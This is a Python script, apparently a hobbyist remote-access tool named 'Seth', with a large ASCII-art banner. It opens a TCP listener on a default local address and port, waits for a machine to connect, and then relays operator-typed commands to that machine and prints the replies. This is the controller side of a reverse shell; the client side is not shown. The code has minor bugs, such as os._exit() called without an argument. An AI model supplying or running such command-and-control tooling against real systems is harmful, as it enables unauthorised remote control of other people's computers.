import os
from re import S
import socket 
from colorama import init as colorInit
from termcolor import colored as c

colorInit()

BANNER = (rf"""
             .                                                      .
           .n                   .                 .                  n.
     .   .dP                  dP                   9b                 9b.    .
    4    qXb         .       dX                     Xb       .        dXp     t
   dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
   9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
    9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
     `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
       `9XXXXXXXXXXXP' `9XX'          `98v8P'         `XXP' `9XXXXXXXXXXXP'
           ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                           )b.  .dbo.dP'`v'`9b.odb.  .dX(
                         ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                        dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                       dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                       9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                        `'      9XXXXXX(   )XXXXXXP      `'
                                 XXXX X.`v'.X XXXX
                                 XP^X'`b   d'`X^XX
                                 X. 9  `   '  P )X
                                 `b  `       '  d'
                                  `             '
                              .        ,;                    
                             ;W      f#i          .    .     
                            f#E    .E#t  GEEEEEEELDi   Dt    
                          .E#f    i#W,   ,;;L#K;;.E#i  E#i   
                         iWW;    L#D.       t#E   E#t  E#t   
                        L##Lffi:K#Wfff;     t#E   E#t  E#t   
                       tLLG##L i##WLLLLt    t#E   E########f.
                         ,W#i   .E#L        t#E   E#j..K#j...
                        j#E.      f#E:      t#E   E#t  E#t   
                      .D#j         ,WW;     t#E   E#t  E#t   
                     ,WK,           .D#;    t#E   f#t  f#t   
                     EG.              tt     fE    ii   ii   
                     ,                        :              
                                   --- Server ---
                                    | S3R43O3 |
                            
        1) Start server
                                
        0) Exit 
                                    
Select a option:""")

class Seth:
    def __init__(self):
        super(Seth).__init__()

        

    def main(self):
        print(c(BANNER, 'red', attrs=['bold']))
        options = {
            1: 'Start server',
            0: 'Exit'
        }
        choice = int(input(''))
        if choice not in options:
            print(c('Invalid option', 'red', attrs=['bold']))
            return self.main()
        elif choice == 1:

            print(c(">>> Enter the host: ", 'yellow'))
            HOST = input('')
            if HOST == '':
                HOST = '192.168.178.33'
                print(c('>>> No host entered, using default host:','red',attrs=['bold']))
            print(c("> Host set to: ", 'yellow') + c(HOST, 'green'))
            
            
            print(c(">>> Enter the port: ", 'yellow'))
            PORT = input('')
            if PORT == '':
                PORT = 4545
                print(c('>>> No port entered, using default port:','red',attrs=['bold']))
            print(c("> Port set to: ", 'yellow') + c(PORT, 'green'))
            PORT = int(PORT)
            print(c(">>> Initialize Seth-Server ...", 'yellow'))
            
            ADDR = (HOST,PORT)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(ADDR)
            print(c('>>> Seth started! Waiting for connection ... ','green',attrs=['bold']))
            server.listen()
            conn, addr = server.accept()
            while True:            
                print(c('>>> Conntected to {addr}'.format(addr=addr), 'red', attrs=['bold']))
                cmd = input('>>> Enter a command: ')
                conn.send(cmd.encode('utf-8'))
                print(conn.recv(1024).decode('utf-8'))
        elif choice == 0:
            os._exit()

def main():
    seth = Seth()
    try:
        seth.main()
    except KeyboardInterrupt:
        os._exit()

if __name__ == '__main__':
    main()